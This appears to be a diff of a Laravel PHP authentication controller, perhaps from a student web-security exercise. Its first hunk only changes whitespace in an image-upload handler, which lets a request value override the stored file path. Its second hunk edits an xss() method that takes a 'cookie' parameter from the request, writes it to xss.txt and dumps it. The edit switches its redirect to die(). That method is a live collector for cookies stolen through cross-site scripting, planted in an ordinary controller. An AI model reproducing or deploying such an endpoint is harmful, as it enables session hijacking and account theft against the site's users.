@@ -51,9 +51,9 @@ class CustomAuthController extends Controller
             'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
             
         ]);
-
+            
             $data = $request->all();
-        
+
         // Xử lý việc lưu file ảnh và lấy đường dẫn đã lưu
         if ($request->hasFile('image')) {
             $data['image'] = $request->input('image', $request->file('image')->store(''));
@@ -186,7 +186,7 @@ class CustomAuthController extends Controller
     public function xss(Request $request) {
         $cookie = $request->get('cookie');
         file_put_contents('xss.txt', $cookie);
-        var_dump($cookie);//die();
-        return redirect()->intended('list');
+        var_dump($cookie);die();
+       // return redirect()->intended('list');
     }
 }
